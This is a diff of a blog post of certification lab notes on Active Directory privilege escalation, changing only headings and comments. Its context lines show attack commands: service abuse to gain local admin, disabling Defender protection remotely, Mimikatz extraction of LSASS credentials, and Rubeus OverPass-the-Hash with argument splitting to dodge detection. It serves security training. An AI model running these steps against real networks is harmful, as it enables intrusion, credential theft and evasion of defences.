@@ -3,12 +3,12 @@ layout: post
 title: Active Directory (AD) | Local Privilege Escalation
 date: 2024-06-25 7:40:00 +0800
 categories: [Cert, CRTP]
-tags: [Cert, Active Directory]     ## TAG names should always be lowercase
+tags: [Cert, Active Directory]     # TAG names should always be lowercase
 description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
 ---
 
 
-#### Local Privilege Escalation
+## 1. Local Privilege Escalation
 
  In Active Directory Environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:
  
@@ -32,29 +32,29 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
  - https://github.com/enjoiz/Privesc
  - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md - Very NOISY
 
-#### Check for any privilege escalation path - PowerUp
+## 2. Check for any privilege escalation path - PowerUp
 
 First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.
 
 {: .prompt-info }
 ```bash
-##Check for any priviliege escalation path
+#Check for any priviliege escalation path
 Invoke-AllChecks
 
-##Abuse the service and add our current domain user to the local Administrator group
+#Abuse the service and add our current domain user to the local Administrator group
 Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 ```
 
 Now, our user is a local admin !
 
-#### Identify any machine in the domain where our user has local administrative - Find-PSRemotingLocalAdminAccess.ps1
+## 3. Identify any machine in the domain where our user has local administrative - Find-PSRemotingLocalAdminAccess.ps1
 
 Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 
 
 {: .prompt-info }
 ```bash
-##Identify a computer within the network domain where the current user has local admin privileges.
+#Identify a computer within the network domain where the current user has local admin privileges.
 Find-PSRemotingLocalAdminAccess
 ```
 
@@ -63,7 +63,7 @@ We can connect to the machine who has the local administrative access by using w
 ```bash
 winrs -r:dcorp-adminsrv cmd
 
-##Checking the username and computername in the remote winrs session
+#Checking the username and computername in the remote winrs session
 set username
 set computername
 ```
@@ -74,7 +74,7 @@ We can also use PowerShell Remoting
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
 
-#### Identify a machine in the domain where a Domain Admin session is available - PowerView
+## 4. Identify a machine in the domain where a Domain Admin session is available - PowerView
 
 A request will be sent to Domain Controller to retrieve all ComputerName and membership of the domain admin's group which has admin session there.
 {: .prompt-info }
@@ -82,7 +82,7 @@ A request will be sent to Domain Controller to retrieve all ComputerName and mem
 Find-DomainUserLocation
 ```
 
-#### Extract Credentials from LSASS - Invoke Mimikatz
+## 5. Extract Credentials from LSASS - Invoke Mimikatz
 
 Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**
 
@@ -111,7 +111,7 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 ```
 
-#### Using OverPass-the-Hash - Rubeus
+## 6. Using OverPass-the-Hash - Rubeus
 
 Finally, use OverPass-the-Hash to use svcadmin's credentials.
 
@@ -120,7 +120,7 @@ Run the below commands from an elevated shell on the student VM to use Rubeus.
 ```bash
 ArgSplit.bat
 
-##Run the above commands in the same command prompt session
+#Run the above commands in the same command prompt session
 set "z=t"
 set "y=g"
 set "x=t"
@@ -142,7 +142,7 @@ Note that we did not need to have direct access to dcorp-mgmt from student machi
 winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 ```
 
-#### Domain Admin Escalation using Derivative Local Admin - Find-PSRemotingLocalAdminAccess.ps1
+## 7. Domain Admin Escalation using Derivative Local Admin - Find-PSRemotingLocalAdminAccess.ps1
 
 {: .prompt-info }
 ```bash
